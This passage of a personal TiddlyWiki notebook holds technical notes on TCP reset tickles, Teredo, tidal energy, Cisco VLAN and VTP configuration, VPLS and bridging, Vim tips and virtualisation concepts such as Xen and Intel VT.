# Capture the first return packet for this connection, and use that seq no to send a reset. This will work if the seq no has not changed since we captures and sent a reset. If this connection is used heavily, then it might be possible that between the time we capture a packet and use its seq no, the seq no might have changed due to other content being exchanged between both parties. We only make only attempt and do not verify that the RST is acknowledged correctly. So this might have worked or might have failed. We also wait infinitely for the reply from remote side, if the remote side does not reply or is dead, its upto the caller to terminate this process. Fortunately, pcap can capture incoming packets of a NAT and not outgoing packets. So for NAT connections, we use ethernet level packets to send tickles and a normal pcap filter to captures the replies for seq no. </pre>
</div>
<div title="Teredo or IPv6 to IPv4" modifier="YourName" modified="200812051703" created="200812051702" changecount="3">
<pre>Teredo is a tunneling protocol designed to grant IPv6 connectivity to nodes that are located behind IPv6-unaware NAT devices. It defines a way of encapsulating IPv6 packets within IPv4 UDP datagrams that can be routed through NAT devices and on the IPv4 internet.

6to4, the most common IPv6 over IPv4 tunneling protocol, requires the tunnel endpoint to have a public IPv4 address. However, many hosts are currently attached to the IPv4 Internet through one or several NAT devices. In such a situation, the only available public IPv4 address is assigned to the NAT device.

Teredo alleviates this problem by encapsulating IPv6 packets within UDP/IPv4 datagrams, which most NATs can forward properly. Thus, IPv6-aware hosts behind NATs can be used as Teredo tunnel endpoints even when they don't have a dedicated public IPv4 address. In effect, a host implementing Teredo can gain IPv6 connectivity with no cooperation from the local network environment

Teredo node types

Teredo defines several different kind of nodes:
* A Teredo client is a host which has IPv4 connectivity to the internet from behind a NAT and uses the Teredo tunneling protocol to access the IPv6 Internet. Teredo clients are assigned an IPv6 address that starts with the Teredo prefix (2001:0000::/32).
* A Teredo server is a well-known host which is used for initial configuration of a Teredo tunnel. A Teredo server never forwards any traffic for the client (apart from IPv6 pings), and has therefore very modest bandwidth requirements (a few thousand bytes per minute per client at most), which allows a single server to support large numbers of clients. Additionally, a Teredo server can be implemented in a fully stateless manner.
* A Teredo relay serves as the remote end of a Teredo tunnel. A Teredo relay must forward all of the data on behalf of the Teredo clients it serves, with the exception of direct Teredo client to Teredo client exchanges. Therefore, a relay requires a lot of bandwidth and can only support a limited number of simultaneous clients. Each Teredo relay serves a range of IPv6 hosts (e.g. a single campus/company, an ISP or a whole operator network, or even the whole IPv6 Internet); it forwards traffic between any Teredo clients and any host within said range.
* A Teredo host-specific relay is a Teredo relay whose range of service is limited to the very host it runs on. As such, it has no particular bandwidth or routing requirements. A computer with a host-specific relay will use Teredo to communicate with Teredo clients, but it will stick to its main IPv6 connectivity provider to reach the rest of the IPv6 Internet.

For more details refer http://en.wikipedia.org/wiki/Teredo_tunneling</pre>
</div>
<div title="Tidal Energy" modifier="YourName" modified="200811211750" created="200811211749" changecount="4">
<pre>!Tidal energy
Tidal power, sometimes called tidal energy, is a form of hydropower that converts the energy of tides into electricity or other useful forms of power.  Although not yet widely used, tidal power has potential for future electricity generation. Tides are more predictable than wind energy and solar power.

!Tidal Force
The tidal force is a secondary effect of the force of gravity and is responsible for the tides. It arises because the gravitational acceleration experienced by a large body is not constant across its diameter. One side of the body has greater acceleration than its center of mass, and the other side of the body has lesser acceleration.

When a body (body 1) is acted on by the gravity of another body (body 2), the field can vary significantly on body 1 between the side of the body facing body 2 and the side facing away from body 2. Figure 2 shows the differential force of gravity on a spherical body (body 1) exerted by another body (body 2). These so called tidal forces cause strains on both bodies and may distort them or even, in extreme cases, break one or the other apart.

[img[images/field.tidal.png]]

In above figure, the Moon's (or Sun's) gravity differential field at the surface of the earth is known as the Tide Generating Force. This is the primary mechanism that drives tidal action and explains two tidal equipotential bulges, accounting for two high tides per day.

In the case of an elastic sphere, the effect of a tidal force is to distort the shape of the body without any change in volume. The sphere becomes an ellipsoid, with two bulges, pointing towards and away from the other body. An elliptical distortion is approximately what happens to the Earth's oceans under the action of the Moon. The Earth and Moon rotate about their common center of mass or barycenter, and their gravitational attraction provides the centripetal force necessary to maintain this motion. To an observer on the Earth, very close to this barycenter, the situation is one of the Earth as body 1 acted upon by the gravity of the Moon as body 2. All parts of the Earth are subject to the Moon's gravitational forces, causing the water in the oceans to redistribute, forming bulges on the sides near the Moon and far from the Moon.

Tidal power is the only form of energy which derives directly from the relative motions of the Earth-Moon system, and to a lesser extent from the Earth-Sun system. 

Tidal movement causes a continual loss of mechanical energy in the Earth-Moon system due to pumping of water through the natural restrictions around coastlines, and due to viscous dissipation at the seabed and in turbulence. This loss of energy has caused the rotation of the Earth to slow in the 4.5 billion years since formation. During the last 620 million years the period of rotation has increased from 21.9 hours to the 24 hours we see now; in this period the Earth has lost 17% of its rotational energy. Tidal power may take additional energy from the system, increasing the rate of slowing over the next millions of years.

Tidal power can be classified into two main types:
* Tidal stream systems make use of the kinetic energy of moving water to power turbines, in a similar way to windmills that use moving air. This method is gaining in popularity because of the lower cost and lower ecological impact compared to barrages.
* Barrages make use of the potential energy in the difference in height (or head) between high and low tides. Barrages suffer from very high civil infrastructure costs, a worldwide shortage of viable sites, and environmental issues.
</pre>
</div>
<div title="Tips" modifier="YourName" modified="200902221507" created="200801141020" changecount="8">
<pre>[[Google Search Tips]]
[[Mplayer Tips]]
[[Bash Tips]]
[[Image Tips]]
[[Vim Tips]]
[[sed Tips]]
[[awk Tips]]
</pre>
</div>
<div title="Ubuntu bugs" modifier="YourName" created="200812021233" changecount="1">
<pre>!After hibernate usb mouse does not work
sudo modprobe -r -v ohci_hcd &amp;&amp; sudo modprobe -v ohci_hcd
sudo modprobe -r -v ehci_hcd &amp;&amp; sudo modprobe -v ehci_hcd</pre>
</div>
<div title="VCS One" modifier="BhargavaKancherla" modified="200807151039" created="200807151024" changecount="11">
<pre>!AWM - Advanced Workload Management
Groups dependencies are specified as group compatability defintion. 
Load defiintions are now defined in terms of CPU load, network load, memory load. 
Groups have priorities. Higher priority groups could kick out lower priority groups which if the higher priority group have no where eles to login. 

!!Group transistion queue
Is a queue which maintains all the groups that are waiting to be onlined. When a group is kicked out of higher priority queue the group gets added into this GTQ. GTQ can be viewed and its entries can deleted. Its a priority based queue.

!Admin Privilege model
Admin privilege model has been changed to use a hierarchial organisational tree.

!VAL (Virtualisation Abstaction Layer)
Ensures HA for virtual machines and applications running in the ~VMs. VAL can discover what are ~VMs configured, and what are the applications running in the ~VMs. Supports prioritisation of ~VMs. Usecase is only one application is running in one ~VM. The purpose of the VM is to run the application, if the application goes down the VM is restarted to see if the application comes back online. VAL allows adaptive allocation of resources to ~VMs. 

Supports only vmware virtualisation as of now. 
Uses the vmware virtual centre to extract configuration information about the ~VMs and on which physical machines these ~VMs can be run. 

Data centres can be configured inside virtual centre. ~VMs can only be failed over onto physical machines in the same data centre. 

!Frames
Objects in a virtual environement are classified into frames. 3 types of frame objects
# physical frame (ex. ESX Server, ~PSeries ~ManagedServer)
# virtual frame  (ex. ESX virtual machine, IBM LPAR)
# Management Server Frame (ex. Vmware Virtual Centre / IBM HMC)

Physical frames have a capacity attribute that needs to be configured by the user. This capacity is shared amonng the virtual machine frames running on it. 

!!VAD system
A VAD system object is a system which is running VAD client. 

A virtual frame may or may not be linked to a VAD system object. If the virtual frame is linked to a VAD system object, the capacity of the ~VFrame is derived from the load of groups configured to run on the linked VAD system. In case, ~VFrame is not linked to a VAD system, user can configure the capacity attribute of a ~VFrame. 

[img[images/Frame.VCSOne.png]]

A VAD system is a failover destination for applications. 

If a ~VFrame is not linked to a VAD system, it means the ~VFrame needs to be HA, and the user does not want VAD to maange the applications inside the ~VFrame, i.e VAD has to manage ~VFrame for HA and not the applications inside the VM. Similarly we can have a VAD system not linked to a ~VFrame. In this case the user does not care about HA of ~VFrame but only needs HA for the applications. 

Each ~PFrame would also have VAD client running on it. It monitors various resources on that ~PFrame. 

There is a hidden group associated with each ~VFrame, and hidden VAD system associated with ~PFrame. 

A ~VFrame priority is the highest priority of all the groups configured to run in this ~VFrame. 

[img[images/VCSOne.hidden.objects.png]]

!Internal Object List
~InternalObjectList attribute contains hidden objects associated with the frame. For ~PFrames, the ~InternalObjectList contains a VAD system_name and a group_name.  For ~VFrames, the ~InternalObjectList contains group_name of the group whicc is monitoring this ~VFrame only. 

!Final Virtual Machine HA
Virtual machine HA is supported for both ~VMware and Xen. The physical servers need to install VAD client on them to be monitored. The virtual machines are monitored using VAD groups configured on these physical servers. The system associated with ~PFrame and group associated with ~VFrame are hidden to the user. 

!Frame State
For ~PFrames the state attribute reflects the name and state of the hidden system. For ~VFrames, the state attribute reflects the names and states of the hidden group on all ~PFrames. 
</pre>
</div>
<div title="VLAN" modifier="YourName" modified="201006080830" created="201006080607" changecount="15">
<pre>The protocol most commonly used today in configuring virtual LANs is IEEE 802.1Q. rior to the introduction of the 802.1Q standard, several proprietary protocols existed, such as Cisco's ISL (Inter-Switch Link) and 3Com's VLT (Virtual LAN Trunk). Cisco also implemented VLANs over FDDI by carrying VLAN information in an IEEE 802.10 frame header, contrary to the purpose of the IEEE 802.10 standard. 

Both ISL and IEEE 802.1Q tagging perform &quot;explicit tagging&quot; - the frame itself is tagged with VLAN information. ISL uses an external tagging process that does not modify the existing Ethernet frame, while 802.1Q uses a frame-internal field for tagging, and so does modify the Ethernet frame. This internal tagging is what allows IEEE 802.1Q to work on both access and trunk links: frames are standard Ethernet, and so can be handled by commodity hardware.

The IEEE 802.1Q header contains a 4-byte tag header containing a 2-byte tag protocol identifier (TPID) and a 2-byte tag control information (TCI). The TPID has a fixed value of 0x8100 that indicates that the frame carries the 802.1Q/802.1p tag information. The TCI contains the following elements:

* Three-bit user priority
* One-bit canonical format indicator (CFI)
* Twelve-bit VLAN identifier (VID)-Uniquely identifies the VLAN to which the frame belongs

With ISL, an Ethernet frame is encapsulated with a header that transports VLAN IDs between switches and routers. ISL does add overhead to the packet as a 26-byte header containing a 10-bit VLAN ID. In addition, a 4-byte CRC is appended to the end of each frame. This CRC is in addition to any frame checking that the Ethernet frame requires. The fields in an ISL header identify the frame as belonging to a particular VLAN.

A VLAN ID is added only if the frame is forwarded out a port configured as a trunk link. If the frame is to be forwarded out a port configured as an access link, the ISL encapsulation is removed.

!Vlan switchport modes
* ''access'' mode - vlan is configured on switch. Each port on the switch is set to be in 'access' mode and a corresponding vlan set. In this mode the ethernet packet coming out of the server is 1518 bytes and switch adds the vlan header to make the packet of size 1522.  Also called port-based VLANs.
* ''trunk'' mode - In trunk mode the ethernet packet coming out of server will itself consist of vlan header and packet size would be 1522. On the switch the port should be configured to be a 'trunk' port so that the switch does not add any more headers or change the headers. 

!Cisco VLAN ranges
* ''Normal range VLANs'' - VLAN range 1-1005. VLAN numbers 1002 through 1005 are reserved for Token Ring and FDDI VLANs.
* ''Extended range VLANs'' - VLAN range 1006-4094

!Cisco VLAN Trunking Protocol (VTP)
On Cisco Devices, VTP (VLAN Trunking Protocol) maintains VLAN configuration consistency across the entire network. VTP uses Layer 2 trunk frames to manage the addition, deletion, and renaming of VLANs on a network-wide basis from a centralized switch in the VTP server mode. VTP is responsible for synchronizing VLAN information within a VT|P domain and reduces the need to configure the same VLAN information on each switch.

VTP provides the following benefits:

    * VLAN configuration consistency across the network
    * Mapping scheme that allows a VLAN to be trunked over mixed media
    * Accurate tracking and monitoring of VLANs
    * Dynamic reporting of added VLANs across the network
    * Plug-and-play configuration when adding new VLANs

Before creating VLANs on the switch that will be propagated via VTP, a VTP domain must first be set up. A VTP domain for a network is a set of all contiguously trunked switches with the same VTP domain name. All switches in the same management domain share their VLAN information with each other, and a switch can participate in only one VTP management domain. Switches in different domains do not share VTP information.

Dynamic VLANs are created through the use of software. With a VLAN Management Policy Server (VMPS), an administrator can assign switch ports to VLANs dynamically based on information such as the source MAC address of the device connected to the port or the username used to log onto that device. As a device enters the network, the device queries a database for VLAN membership. See also FreeNAC which implements a VMPS server.

VTP only learns about normal-range VLANs (VLAN IDs 1 to 1005). Extended-range VLANs (VLAN IDs greater than 1005) are not supported by VTP or stored in the VTP VLAN database. 

!!! VTP Modes

| ''VTP Mode'' | ''Description'' |
| ''VTP server'' | In VTP server mode, you can create, modify, and delete VLANs, and specify other configuration parameters (such as the VTP version) for the entire VTP domain. VTP servers advertise their VLAN configurations to other switches in the same VTP domain and synchronize their VLAN configurations with other switches based on advertisements received over trunk links. In VTP server mode, VLAN configurations are saved in NVRAM. VTP server is the default mode.|
| ''VTP client'' | A VTP client behaves like a VTP server and transmits and receives VTP updates on its trunks, but you cannot create, change, or delete VLANs on a VTP client. VLANs are configured on another switch in the domain that is in server mode. In VTP client mode, VLAN configurations are not saved in NVRAM.|
| ''VTP transparent''(disabled) | VTP transparent switches do not participate in VTP. A VTP transparent switch does not advertise its VLAN configuration and does not synchronize its VLAN configuration based on received advertisements. However, in VTP Version 2, transparent switches do forward VTP advertisements that they receive from other switches through their trunk interfaces. You can create, modify, and delete VLANs on a switch in VTP transparent mode. |

The switch must be in VTP transparent mode when you create extended-range VLANs.

The switch must be in VTP transparent mode when you create private VLANs. 

When the switch is in VTP transparent mode, the VTP and VLAN configurations are saved in NVRAM, but they are not advertised to other switches. In this mode, VTP mode and domain name are saved in the switch running configuration, and you can save this information in the switch startup configuration file by using the copy running-config startup-config privileged EXEC command. The running configuration and the saved configuration are the same for all switches in a stack. 

!!! Configuring VTP
{{{
cisco&gt; enable
cisco # configure terminal
cisco (config) # vtp mode server
cisco (config) # vtp domain &lt;domain-name&gt;
cisco (config) # vtp password &lt;password&gt;
cisco (config) # end
cisco # show vtp status
}}}
{{{
cisco&gt; enable
cisco # configure terminal
cisco (config) # vtp mode client
cisco (config) # vtp domain &lt;domain-name&gt;
cisco (config) # vtp password &lt;password&gt; (optional)
cisco (config) # end
cisco # show vtp status
}}}
{{{
cisco&gt; enable
cisco # configure terminal
cisco (config) # vtp mode transparent
cisco (config) # end
cisco # show vtp status
}}}
Always ''copy running-config startup-config''.

!Protocol Based VLANs
In a protocol based VLAN enabled switch, traffic is forwarded through ports based on protocol. Essentially, the user tries to segregate or forward a particular protocol traffic from a port using the protocol based VLANs; traffic from any other protocol is not forwarded on the port. For example, if you have connected a host, pumping ARP traffic on the switch at port 10, connected a Lan pumping IPX traffic to the port 20 of the switch and connected a router pumping IP traffic on port 30, then if you define a protocol based VLAN supporting IP and including all the three ports 10, 20 and 30 then IP packets can be forwarded to the ports 10 and 20 also, but ARP traffic will not get forwarded to the ports 20 and 30, similarly IPX traffic will not get forwarded to ports 10 and 30.

!Port Membership Modes and Characteristics

| ''Membership Mode'' | ''VLAN Membership Characteristics'' | ''VTP Characteristics'' |
| ''Static-access'' | A static-access port can belong to one VLAN and is manually assigned to that VLAN. | VTP is not required. If you do not want VTP to globally propagate information, set the VTP mode to transparent. To participate in VTP, there must be at least one trunk port on the switch stack connected to a trunk port of a second switch or switch stack. |
| ''Trunk (ISL or IEEE 802.1Q)'' | A trunk port is a member of all VLANs by default, including extended-range VLANs, but membership can be limited by configuring the allowed-VLAN list. You can also modify the pruning-eligible list to block flooded traffic to VLANs on trunk ports that are included in the list. | VTP is recommended but not required. VTP maintains VLAN configuration consistency by managing the addition, deletion, and renaming of VLANs on a network-wide basis. VTP exchanges VLAN configuration messages with other switches over trunk links. |
| ''Dynamic access'' | A dynamic-access port can belong to one VLAN (VLAN ID 1 to 4094) and is dynamically assigned by a VMPS. The VMPS can be a Catalyst 5000 or Catalyst 6500 series switch, for example, but never a Catalyst 3750 switch. The Catalyst 3750 switch is a VMPS client. You can have dynamic-access ports and trunk ports on the same switch, but you must connect the dynamic-access port to an end station or hub and not to another switch. | VTP is required. Configure the VMPS and the client with the same VTP domain name. To participate in VTP, there must be at least one trunk port on the switch stack connected to a trunk port of a second switch or switch stack. |
| ''Voice VLAN'' | A voice VLAN port is an access port attached to a Cisco IP Phone, configured to use one VLAN for voice traffic and another VLAN for data traffic from a device attached to the phone. | VTP is not required; it has no affect on a voice VLAN. |
| ''Private VLAN'' | A private VLAN port is a host or promiscuous port that belongs to a private VLAN primary or secondary VLAN. | The switch must be in VTP transparent mode when you configure private VLANs. When private VLANs are configured on the switch, do not change VTP mode from transparent to client or server mode. |
| ''Tunnel (dot1q-tunnel)'' | Tunnel ports are used for IEEE 802.1Q tunneling to maintain customer VLAN integrity across a service-provider network. You configure a tunnel port on an edge switch in the service-provider network and connect it to an IEEE 802.1Q trunk port on a customer interface, creating an asymetric link. A tunnel port belongs to a single VLAN that is dedicated to tunneling. | VTP is not required. You manually assign the tunnel port to a VLAN by using the switchport access vlan interface configuration command. |

''Trunk Encapsulation Types'' 
| ''Encapsulation'' | ''Function'' |
| ''switchport trunk encapsulation isl'' | Specifies ISL encapsulation on the trunk link. |
| ''switchport trunk encapsulation dot1q'' | Specifies IEEE 802.1Q encapsulation on the trunk link. |
| ''switchport trunk encapsulation negotiate'' | Specifies that the interface negotiate with the neighboring interface to become an ISL (preferred) or IEEE 802.1Q trunk, depending on the configuration and capabilities of the neighboring interface. This is the default for the switch. |


!Configuring VLAN on cisco catalyst 3750 
!!! Create a VLAN
{{{
cisco&gt; enable
cisco # configure terminal
cisco (config) # vlan &lt;vlan-id&gt;  (This will create the vlan, if vlan does not exist)
cisco (config-vlan) # name &lt;vlan-name&gt;  (Optional)
cisco (config-vlan) # exit
}}}
Always ''copy running-config startup-config''.

!!! Deleting a VLAN
{{{
cisco&gt; enable
cisco # configure terminal
cisco (config) # no vlan &lt;vlan-id&gt;
}}}
This operation only deletes vlan and does not move any ports on this vlan to default vlan. To move any ports on this vlan, you have to explicitly put those ports on a specific vlan
Always ''copy running-config startup-config''.

!!! Adding/Moving a port to VLAN
{{{
cisco&gt; enable
cisco # configure terminal
cisco (config) # interface GigabitEthernet 1/0/1
cisco (config-fi) # switchport mode access
cisco (config-if) # switchport access vlan &lt;vlan-id&gt;
cisco (config-if) # exit
cisco (config) # exit
}}}
Always ''copy running-config startup-config''.

!!! Removing a port from VLAN
{{{
cisco&gt; enable
cisco # configure terminal
cisco (config) # interface GigabitEthernet 1/0/1
cisco (config-if) # no switchport
cisco (config-if) # switchport
cisco (config-if) # exit
cisco (config) # exit
}}}
Always ''copy running-config startup-config''.

!!! Configuring a port to trunk (802.1q)
{{{
cisco&gt; enable
cisco # configure terminal
cisco (config) # interface GigabitEthernet 1/0/1
cisco (config-if) # switchport trunk encapsulation do1q
cisco (config-if) # switchport mode trunk
cisco (config-if) # switchport trunk allowed vlan {add | all | except | remove} &lt;vlan-list&gt;
cisco (config-if) # switchport access vlan &lt;vlan-id&gt; (Optional, Specify the default VLAN, which is used if the interface stops trunking.
cisco (config-if) # switchport native vlan &lt;vlan-id&gt; (Optional, Specify the native VLAN for IEEE 802.1Q trunks, for non-tagged traffic )
cisco (config-if) # exit
}}}
Always ''copy running-config startup-config''.

!Cisco VMPS
The VLAN Query Protocol (VQP) is used to support dynamic-access ports, which are not permanently assigned to a VLAN, but give VLAN assignments based on the MAC source addresses seen on the port. Each time an unknown MAC address is seen, the switch sends a VQP query to a remote VMPS; the query includes the newly seen MAC address and the port on which it was seen. When the VMPS receives this query, it searches its database for a MAC-address-to-VLAN mapping. The VMPS responds with a VLAN assignment for the port. The switch cannot be a VMPS server but can act as a client to the VMPS and communicate with it through VQP.  In secure mode, the server shuts down the port when an illegal host is detected. In open mode, the server simply denies the host access to the port. The switch continues to monitor the packets directed to the port and sends a query to the VMPS when it identifies a new host address. If the switch receives a port-shutdown response from the VMPS, it disables the port. The port must be manually re-enabled by using Network Assistant, the CLI, or SNMP. 

http://www.cisco.com/en/US/docs/switches/lan/catalyst3750/software/release/12.2_25_sec/configuration/guide/swvlan.html#wp1103064



</pre>
</div>
<div title="VPLS" modifier="YourName" modified="200811221145" created="200811221144" changecount="2">
<pre>!Bridge
A network bridge connects multiple network segments at the data link layer (layer 2) of the OSI model, and the term layer 2 switch is very often used interchangeably with bridge. 

In Ethernet networks, the term &quot;bridge&quot; formally means a device that behaves according to the IEEE 802.1D standard, this is most often referred to as a network switch in marketing literature. Bridges tend to be more complex than hubs or repeaters due to the fact that bridges are capable of analyzing incoming data packets on a network to determine if the bridge is able to send the given packet to another segment of that same network.

Switches that additionally process data at the Network layer (layer 3) (and above) are often referred to as Layer 3 switches or Multilayer switches.

At any layer, a modern switch may implement power over Ethernet (PoE), which avoids the need for attached devices, such as an IP telephone or wireless access point, to have a separate power supply.

!!! Transparent bridging 
This method uses a forwarding database to send frames across network segments. The forwarding database is initially empty and entries in the database are built as the bridge receives frames. If an address entry is not found in the forwarding database, the frame is rebroadcast to all ports of the bridge, forwarding the frame to all segments except the source address. 

By means of these broadcast frames, the destination network will respond and a route will be created. Along with recording the network segment to which a particular frame is to be sent, bridges may also record a bandwidth metric to avoid looping when multiple paths are available. Devices that have this transparent bridging functionality are also known as adaptive bridges. They are primarily found in Ethernet networks.

!!!Source route bridging 
With source route bridging two frame types are used in order to find the route to the destination network segment. Single-Route (SR) frames comprise most of the network traffic and have set destinations, while All-Route(AR) frames are used to find routes. 

Bridges send AR frames by broadcasting on all network branches; each step of the followed route is registered by the bridge performing it. Each frame has a maximum hop count, which is determined to be greater than the diameter of the network graph, and is decremented by each bridge. The first AR frame which reaches its destination is considered to have followed the best route, and the route can be used for subsequent SR frames; the other AR frames are discarded. 

This method of locating a destination network can allow for indirect load balancing among multiple bridges connecting two networks. The more a bridge is loaded, the less likely it is to take part in the route finding process for a new destination as it will be slow to forward packets. This method is very different from transparent bridge usage, where redundant bridges will be inactivated; however, more overhead is introduced to find routes, and space is wasted to store them in frames.

!!!Traffic monitoring on a switched network
Unless port mirroring or other methods such as RMON[10] or SMON are implemented in a switch, it is difficult to monitor traffic that is bridged using a switch because all ports are isolated until one transmits data, and even then only the sending and receiving ports can see the traffic. These monitoring features rarely are present on consumer-grade switches.

Two popular methods that are specifically designed to allow a network analyst to monitor traffic are:

* Port mirroring  - the switch sends a copy of network packets to a monitoring network connection.
* SMON - &quot;Switch Monitoring&quot; is described by RFC 2613 and is a protocol for controlling facilities such as port mirroring.

Another method to monitor may be to connect a Layer-1 hub between the monitored device and its switch port. This will induce minor delay, but will provide multiple interfaces that can be used to monitor the individual switch port.


!VPLS
Virtual private LAN service (VPLS) is a way to provide Ethernet based multipoint to multipoint communication over IP/MPLS networks. It allows geographically dispersed sites to share an Ethernet broadcast domain by connecting sites through pseudo-wires. The technologies that can be used as pseudo-wire can be Ethernet over MPLS, L2TPv3 or even GRE. There are two IETF standards track RFCs (RFC 4761 and RFC 4762) describing VPLS establishment.

VPLS is a virtual private network (VPN) technology. In contrast to layer 2 MPLS VPNs or L2TPv3, which allow only point-to-point layer 2 tunnels, VPLS allows any-to-any (multipoint) connectivity.

In a VPLS, the local area network (LAN) at each site is extended to the edge of the provider network. The provider network then emulates a switch or bridge to connect all of the customer LANs to create a single bridged LAN.

Since VPLS emulates a LAN, full mesh connectivity is required. There are two methods for full mesh establishment for VPLS: using BGP and using Label Distribution Protocol (LDP). The &quot;control plane&quot; is the means by which provider edge (PE) routers communicate for auto-discovery and signaling. Auto-discovery [1] refers to the process of finding other PE routers participating in the same VPN or VPLS. Signaling is the process of establishing pseudo-wires (PW). The PWs constitute the &quot;data plane&quot;, whereby PEs send customer VPN/VPLS traffic to other PEs.

With BGP, one has auto-discovery as well as signaling. The mechanisms used are very similar to those used in establishing Layer-3 MPLS VPNs. Each PE is configured to participate in a given VPLS. The PE, through the use of BGP, simultaneously discovers all other PEs in the same VPLS, and establishes a full mesh of pseudo-wires to those PEs.

With LDP, each PE router must be configured to participate in a given VPLS, and, in addition, be given the addresses of other PEs participating in the same VPLS. A full mesh of LDP sessions is then established between these PEs. LDP is then used to create an equivalent mesh of PWs between those PEs.

PEs participating in a VPLS-based VPN must appear as an Ethernet bridge to connected customer edge (CE) devices. Received Ethernet frames must be treated in such a way as to ensure CEs can be simple Ethernet devices.

When a PE receives a frame from a CE, it inspects the frame and learns the CE's MAC address, storing it locally along with LSP routing information. It then checks the frame's destination MAC address. If it is a broadcast frame, or the MAC address is not known to the PE, it floods the frame to all PEs in the mesh.

Ethernet does not have a time to live (TTL) field in its frame header, so loop avoidance must be arranged by other means. In regular Ethernet deployments, Spanning Tree Protocol is used for this. In VPLS, loop avoidance is arranged by the following rule: A PE never forwards a frame received from a PE, to another PE. The use of a full mesh combined with split horizon forwarding guarantees a loop-free broadcast domain.

VPLS is typically used to link a large number of sites together. Scalability is therefore an important issue that needs addressing.


</pre>
</div>
<div title="Vim Tips" modifier="YourName" modified="200807020420" created="200807011548" changecount="8">
<pre>{{{
:Ex : file explorer note capital Ex
&lt;C-N&gt; &lt;C-P&gt; : word completion in insert mode
&lt;C-X&gt;&lt;C-L&gt; : Line complete SUPER USEFUL
/&lt;C-R&gt;&lt;C-W&gt; : Pull &lt;cword&gt; onto search/command line
guu : lowercase line
gUU : uppercase line
gf : open file name under cursor (SUPER)
ga : display hex, ascii value of character under cursor
&lt;C-O&gt; : retrace your movements in file (old)
&lt;C-I&gt; : retrace your movements in file (new)
:r!ls            : reads in output of ls (use dir on windows)

:r !grep &quot;^ebay&quot; file.txt  : grepping in content
:20,25 !rot13    : rot13 lines 20 to 25
:r!date           : same thing

:%!sort -u       : use an external program to filter content
:'a,'b!sort -u   : use an external program to filter content
:g/^$/;,/^$/-1!sort : sort each block (note the crucial ;)
}}}

Using !!command in normal mode will automatically translate to :.!command
This will send the current line to the command, and replace the current line with command's result
{{{
!!date           : Replaces current line with date
!!which 'command': Replace current line with the absolute path to 'command'
!!tr -d abcd     : Delete a,b,c,d from the current line
}}}

You can also use ! on a visual selection. Select an area with one of the visualmode commands, and then type !command to pipe the whole selection through command. (Note that this is equivalent to :'&lt;,'&gt;!command). For example, after selecting multiple lines with visualmode:
{{{
!sort            : Filters the lines through the sort program
!grep word       : delete all lines not containing 'word'
}}}

Searching
{{{
/^joe.*fred.*bill/ : normal
/^[A-J]\+/ : search for lines beginning A-J followed by at leat 1 A-J
/forum\(\_.\)*pent search over possible multiple lines
/fred\_s*joe/i : any whitespace including newline
/fred\|joe : Search for FRED OR JOE
}}}

Substitution
{{{
:%s/fred/joe/igc : general substitute command
:%s/\r//g : Delete DOS returns ^M
:'a,'bg/fred/s/dick/joe/gc : VERY USEFUL
:s/\(.*\):\(.*\)/\2 : \1/ : reverse fields separated by :
:%s/^.\{-}pdf/new.pdf/ non greedy matching (ie to first pdf)
:s/fred/&lt;c-r&gt;a/g substitute &quot;fred&quot; with contents of register &quot;a&quot;
:%s/^\(.*\)\n\1/\1$/ delete duplicate lines
# non-greedy matching \{-}
:%s/^.\{-}pdf/new.pdf/
:help /\{-}
:s/fred/&lt;c-r&gt;a/g substitute &quot;fred&quot; with contents of register &quot;a&quot;
# multiple commands
:%s/\f\+\.gif\&gt;/\r&amp;\r/g | v/\.gif$/d | %s/gif/jpg/
:%s/suck\|buck/loopy/gc : ORing
:s/__date__/\=strftime(&quot;%c&quot;)/ : insert datestring
}}}

{{{
:g/^\s*$/d :delete all blank lines
:g!/^dd/d : delete lines not containing string
:v/^dd/d : delete lines not containing string
:g/fred/,/joe/d : not line based
:v/./.,/./-1join : compress empty lines
:'a,'b g/^Error/ . w &gt;&gt; errors.txt
:g/cmap\|form/p : ORing
}}}</pre>
</div>
<div title="Virtualisation" modifier="BhargavaKancherla" modified="200807151043" created="200801160659" changecount="12">
<pre>!!Full Virtualisation
also called true, classical, hardware, native, trap-and-emulate, hardware-virtural-machine
Properties of full virtualisation are
* Fidelity - Identical execution as guest or stand-alone. Guest should not be able to tell whether its running in a VM or not. 
* Performance - most instructions run at the same speed as native. 
* runs in a hidden segment with own protection, can see all hw state.
* can run multiple OSes of different versions concurrently
* recursive hypervisors (nested hypervisors)

!hypervisor
hypervisor is like an OS that provides virtual environments. 
2 types
# Binary Translation - modifies operating system code at run-time.  
# Para-vitrualisation - operating system code is modified before hand. 

!!Para-virtualisation
This presents a software interface to VMs that is similar but not identical to that of the underlying hardware. What usually happens each OS uses a HAL (hardware abstraction layer) which is ported to use hypervisor as another target architecture. Also supports batching of page-table operations. 

!Emulators
Usually not hypervisor-based and not usually considered virtualisation. Its a program that emulates entire CPU, motherboard and other peripherals. Sacrifies performance and easy to implement. One of the good known emulators is QEMU, KVM, VirtualBox.

Emulators also do dynamic translation of instructions ( also called Just-in-time compilation). About 4x slow as native. 

KQEMU is kernel-mode QEMU. Its a driver that works with QEMU, but does not do binary translation or patching, but executes code directly by arranging to trap-and-emulate privileged code. 

!XDC
supports para-virtualisation guests. Also supports unmodified guests but not hardware architectureus which have virtualisation support built-in. 

!!Domain
Dom0 is the first doamin started at boot time, it manages all the hardware, and also manages all the other domains. Dom0 is responsible for starting or stopping other domains, responsible for I/O and network traffic. Rest of the domains are called DomU which are called Under-priviliged domain. All these under-priviliged domains use Dom0 to perform any hardware interactions. 

[img[images/Xen.architecture.png]]

!Intel Ring Architecture
Intel cpu has levels called Rings. Operating systems usually run in Ring0. Ring0 has special privileged instrucntions that can only be run in Ring0. 

!Why XDC cannot support unmodified guests in old hardware
Hypervisor usually runs in Ring0, so virtual machines run in a lower level ring. So if the guests are not modified they would execute privilege instructions and cause faults. 

!How IntelVT helps
IntelVT allows both the hypervisor and virtual machines to run in Ring0. In Ring0 there are 2 modes
# Vmx-root
# Vmx-non-root
Hypervisor runts at Vmx-root and guest operating system runs at vmx-nonroot. Now guest operating systems running privilege instrunctions insted of being fauled go into hypervisor through some linkage, which is setup when the hypervrisor starts. 

IntelVT has different varieties
# Vanderpool
# VT-x (virtualisation on x86)
# VT-I (virtualisation on Itanium)
# VT-d (virtualisation of dma

!Intel EPT and AMD NPT ( Extended/Nested Page Tables )
hypervisor usually fakes page tables. Instead of hypervisor maintaining another page translation these technologies provide automatinc page translation. 

!Page sharing 
Paravirtualision driver shares pages with guest operating system, so that the network and I/O traffic do not experience any performance problems. The frontend and backend drivers share pages. 

!OS ABI ( Application Binary Interface ) virtualisation
